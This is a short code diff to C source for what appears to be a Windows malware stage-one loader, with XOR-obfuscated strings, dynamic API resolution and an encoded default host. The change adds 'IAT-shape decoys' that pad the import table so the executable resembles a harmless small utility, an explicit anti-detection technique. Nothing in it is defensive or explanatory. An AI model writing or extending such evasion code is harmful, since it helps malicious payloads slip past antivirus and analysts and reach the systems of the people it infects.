@@ -19,6 +19,7 @@
 #ifdef _WIN32
 #  include "api_table.h"
 #  include "xor_string.h"
+#  include "decoys.h"
 #else
 #  include <stdlib.h>
 #endif
@@ -60,6 +61,12 @@ void __attribute__((noreturn)) stage1_entry(void)
     size_t   payload_len = 0;
     int      rc = 1;
     char     host_buf[sizeof(k_default_host_enc)];
+
+    /* IAT-shape decoys — populates the import table with kernel32
+     * entries so the PE silhouette matches a normal small utility.
+     * Behaviour-neutral; result is sunk into a volatile. */
+    static volatile uint32_t decoy_sink;
+    decoy_sink ^= decoys_run();
 
     if (resolve_apis() != 0) goto done;
     if (!config_valid(&g_config)) goto done;
